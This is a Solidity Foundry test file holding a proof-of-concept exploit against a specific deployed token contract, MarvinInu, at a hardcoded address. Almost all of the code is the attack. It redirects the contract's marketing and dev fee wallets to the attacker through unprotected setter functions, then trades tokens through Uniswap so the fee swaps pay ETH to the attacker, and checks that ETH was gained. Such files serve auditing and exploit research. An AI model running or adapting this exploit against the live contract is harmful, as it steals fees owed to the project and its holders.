interface IMarvinInu {
    function owner() external view returns (address);
    function enableTrading() external;
    function updateMarketingWallet(address) external;
    function updateDevWallet(address) external;
    function uniswapV2Router() external view returns (address);
    function swapTokensAtAmount() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

// Add WETH interface
interface IWETH {
    function deposit() external payable;
    function withdraw(uint) external;
    function approve(address, uint) external returns (bool);
    function balanceOf(address) external view returns (uint);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x55a380d134d722006A5CE2d510562e1239D225B1;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the contract owner
        address owner = IMarvinInu(TARGET).owner();

        // Label addresses for clarity
        vm.label(owner, 'Contract Owner');
        vm.label(TARGET, 'MarvinInu Contract');
        vm.label(attacker, 'Attacker');

        // Impersonate owner to enable trading
        vm.startPrank(owner);
        IMarvinInu(TARGET).enableTrading();
        vm.stopPrank();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial ETH balance
        uint256 initialBalance = address(this).balance;

        // Step 1: Change fee wallets to attacker address (unprotected!)
        IMarvinInu(TARGET).updateMarketingWallet(address(this));
        IMarvinInu(TARGET).updateDevWallet(address(this));

        // Step 2: Get some ETH to buy tokens
        deal(address(this), 100 ether);

        // Step 3: Buy MARVIN tokens on Uniswap
        address router = IMarvinInu(TARGET).uniswapV2Router();
        address weth = IUniswapV2Router02(router).WETH();

        // Create buy path: WETH -> MARVIN
        address[] memory buyPath = new address[](2);
        buyPath[0] = weth;
        buyPath[1] = TARGET;

        // Approve router to spend WETH
        IERC20(weth).approve(router, type(uint256).max);

        // Buy some MARVIN tokens
        IUniswapV2Router02(router).swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: 10 ether
        }(
            0, // amountOutMin
            buyPath,
            address(this),
            block.timestamp
        );

        // Step 4: Sell MARVIN tokens to generate fees
        // Approve router to spend MARVIN tokens
        IERC20(TARGET).approve(router, type(uint256).max);

        // Create sell path: MARVIN -> WETH
        address[] memory sellPath = new address[](2);
        sellPath[0] = TARGET;
        sellPath[1] = weth;

        // Get our MARVIN balance
        uint256 marvinBalance = IERC20(TARGET).balanceOf(address(this));

        // Sell all tokens to generate maximum fees
        if (marvinBalance > 0) {
            IUniswapV2Router02(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
                marvinBalance, // amountIn
                0, // amountOutMin
                sellPath,
                address(this),
                block.timestamp
            );
        }

        // Step 5: Check if swapBack was triggered
        // We need to wait for contract to accumulate enough tokens to reach swapTokensAtAmount
        // Or trigger it by making another transaction that accumulates fees

        // Let's check contract token balance
        uint256 contractTokenBalance = IERC20(TARGET).balanceOf(TARGET);
        uint256 swapThreshold = IMarvinInu(TARGET).swapTokensAtAmount();

        // If contract has enough tokens, swapBack should trigger automatically on next transfer
        // Let's make another small trade to potentially trigger it
        if (contractTokenBalance > 0) {
            // Buy a small amount again
            IUniswapV2Router02(router).swapExactETHForTokensSupportingFeeOnTransferTokens{
                value: 1 ether
            }(
                0,
                buyPath,
                address(this),
                block.timestamp
            );

            // And sell it immediately
            uint256 newBalance = IERC20(TARGET).balanceOf(address(this));
            if (newBalance > 0) {
                IUniswapV2Router02(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
                    newBalance,
                    0,
                    sellPath,
                    address(this),
                    block.timestamp
                );
            }
        }

        // Check final ETH balance
        uint256 finalBalance = address(this).balance;
        require(finalBalance > initialBalance, 'No ETH gained from fee diversion');
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

